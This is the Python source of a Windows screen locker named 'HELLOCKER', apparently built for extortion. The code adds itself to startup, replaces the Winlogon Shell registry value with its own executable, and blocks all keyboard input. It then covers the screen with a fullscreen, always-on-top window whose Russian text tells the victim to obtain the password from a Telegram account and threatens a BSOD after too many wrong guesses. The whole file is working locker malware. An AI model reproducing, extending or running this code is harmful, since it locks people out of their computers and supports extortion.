from tkinter import *
from tkinter import messagebox
from functools import partial
from modules import bsod, startup, uninstall
from config import password, count, tg_username
import string
from PIL import ImageTk, Image
import subprocess
import random
import time
import os
import keyboard
import sys
import winreg

def set_custom_shell(exe_path):
    try:
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"REESTR ERROR: {e}")

def restore_shell():
    try:
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, "explorer.exe")
        winreg.CloseKey(key)
    except Exception as e:
        print(f"RESTORE ERROR: {e}")

def play_intro(parent):
    gif_path = resource_path("000000.gif")
    if not os.path.exists(gif_path):
        parent.deiconify()
        return

    intro = Toplevel(parent)
    intro.attributes('-fullscreen', True)
    intro.attributes('-topmost', True)
    intro.config(bg="black", cursor="none")
    intro.protocol("WM_DELETE_WINDOW", lambda: None)
    
    sw = parent.winfo_screenwidth()
    sh = parent.winfo_screenheight()
    
    try:
        img = Image.open(gif_path)
        frames = []
        try:
            while True:
                resized_frame = img.copy().resize((sw, sh), Image.LANCZOS)
                frames.append(ImageTk.PhotoImage(resized_frame))
                img.seek(len(frames))
        except EOFError:
            pass

        label = Label(intro, borderwidth=0, highlightthickness=0, bg="black")
        label.pack(fill=BOTH, expand=True)

        def animate(ind):
            if ind < len(frames):
                label.config(image=frames[ind])
                label.image = frames[ind]
                intro.after(50, animate, ind + 1)
            else:
                parent.deiconify()
                parent.attributes('-topmost', True) 
                intro.destroy()

        animate(0)
    except Exception:
        parent.deiconify()
        if 'intro' in locals(): intro.destroy()

def resource_path(relative_path):
    """ """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
prog_list = string.ascii_uppercase + string.digits
random_list = ''.join(random.choices(prog_list, k=8))
pc_id = f"current pc id: WIN-{random_list}\n"

lock_text = f"Ваш windows заблокирован, Любые попытки обойти locker приведут к проблемам с системой. \nПри вводе неправильного пароля {count} раз будет запущен BSOD (экран смерти). \nДля запроса пароля пишите в телеграмм: @{tg_username}\n\n"

file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])

startup(file_path)

current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__

set_custom_shell(current_exe)

def buton(arg):
	enter_pass.insert(END, arg)

def delbuton():
	enter_pass.delete(-1, END)

def tapp(key):
	pass

def check():
	global count
	if enter_pass.get() == password:
                messagebox.showinfo("LOCKER","UNLOCKED SUCCESSFULLY")
                uninstall(wind)
                restore_shell()
                os.system("start explorer.exe")
                uninstall(wind)
	else:
		count -= 1
		if count == 0:
			messagebox.showwarning("LOCKER","number of attempts expired")
			uninstall(wind)
		else:
			
			messagebox.showwarning("LOCKER","Wrong password. Avalible tries: "+ str(count))
def exiting():
	messagebox.showwarning("LOCKER","DEATH IS INEVITABLE")


wind = Tk()
wind.withdraw()
wind.title("HELLOCKER")
play_intro(wind)

img_path = resource_path("000000.jpg")
image = Image.open(img_path)
screen_width = wind.winfo_screenwidth()
screen_height = wind.winfo_screenheight()

image = image.resize((screen_width, screen_height), Image.LANCZOS)
bg_image = ImageTk.PhotoImage(image)

bg_label = Label(wind, image=bg_image)
bg_label.place(x=0, y=0, relwidth=1, relheight=1)
bg_label.image = bg_image

UNTEXD = Label(wind,bg="black", fg="red",text="        WINDOWS LOCKED         \n", font="helvetica 75").pack()
untex = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 25")
untex.pack(side=TOP)

extra_text_label = Label(wind, bg="black", fg="red", text=pc_id, font="helvetica 10")
extra_text_label.place(relx=1.0, rely=1.0, anchor="se", x=-5, y=-1)

keyboard.on_press(tapp, suppress=True)

enter_pass = Entry(wind,bg="black", fg="red", text="", font="helvetica 35")
enter_pass.pack()

wind.resizable(0,0)
wind.lift()
wind.attributes('-topmost',True)
wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)

button = Button(wind,text='Ввод',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=check)
button.pack()

wind.protocol("WM_DELETE_WINDOW", exiting)

button0 = Button(wind,text='0',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "0")).pack(side=LEFT)
button1 = Button(wind,text='1',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "1")).pack(side=LEFT)
button2 = Button(wind,text='2',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "2")).pack(side=LEFT)
button3 = Button(wind,text='3',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "3")).pack(side=LEFT)
button4 = Button(wind,text='4',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "4")).pack(side=LEFT)
button5 = Button(wind,text='5',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "5")).pack(side=LEFT)
button6 = Button(wind,text='6',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "6")).pack(side=LEFT)
button7 = Button(wind,text='7',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "7")).pack(side=LEFT)
button8 = Button(wind,text='8',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "8")).pack(side=LEFT)
button9 = Button(wind,text='9',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "9")).pack(side=LEFT)
delbutton = Button(wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=delbuton).pack(side=LEFT)

wind.mainloop()